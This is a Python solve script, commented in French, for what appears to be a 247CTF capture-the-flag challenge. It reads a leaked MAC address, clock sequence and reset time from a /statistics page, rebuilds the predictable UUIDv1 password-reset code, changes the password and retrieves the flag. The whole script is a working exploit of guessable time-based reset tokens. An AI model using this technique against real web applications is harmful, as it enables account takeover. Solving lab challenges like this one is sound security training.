#!/usr/bin/env python3

import requests
import time
import uuid
import re

def uuid1(ts, node, clock_seq):

    timestamp = ts // 100 + 0x01b21dd213814000
    time_low = timestamp & 0xffffffff
    time_mid = (timestamp >> 32) & 0xffff
    time_hi_version = (timestamp >> 48) & 0x0fff
    clock_seq_low = clock_seq & 0xff
    clock_seq_hi_variant = (clock_seq >> 8) & 0x3f
    return uuid.UUID(fields=(time_low, time_mid, time_hi_version,
                        clock_seq_hi_variant, clock_seq_low, node), version=1)

host = "https://7dcea6c4358dce3b.247ctf.com"

get_mac = re.compile("HWaddr (.{17,})")
get_clock_seq = re.compile("clock_sequence: (.{1,})")
get_last_reset = re.compile("last_reset: (.{,30})")


r = requests.get(host + "/statistics")
try :
    mac = int(re.search(get_mac, r.text).group(1).replace(':',''), 16)
    clock_seq = int(re.search(get_clock_seq, r.text).group(1))
    last_reset = re.search(get_last_reset, r.text).group(1)
except Exception as e :
    print(e)
    exit()

print(f"Node : {mac}")
print(f"Clock sequence : {clock_seq}")
print(f"Last_reset : {last_reset}")
print(f"Calcul du timestamp pour la date {last_reset[:19]}.")

timestamp = int(time.mktime(time.strptime(last_reset[:19], "%Y-%m-%d %H:%M:%S")))
print(f"Timestamp = {timestamp} secondes")

last_reset_exploded = last_reset.split('.')
nanoseconds = int(last_reset_exploded[-1])
print(f"Ajout des {nanoseconds} nanosecondes")

timestamp += 3600 # Cause of UTC
timestamp *= 1000 * 1000 * 1000
timestamp += nanoseconds

uuid = uuid1(int(timestamp) , mac, clock_seq)
print(f"UUID : {uuid}")

print("Envoi des donn√©es pour reset le password.")

r = requests.get(host + f"/update_password?reset_code={uuid}&password=coucou")
r = requests.get(host + f"/get_flag?password=coucou")
print(f"Flag : {r.text}")
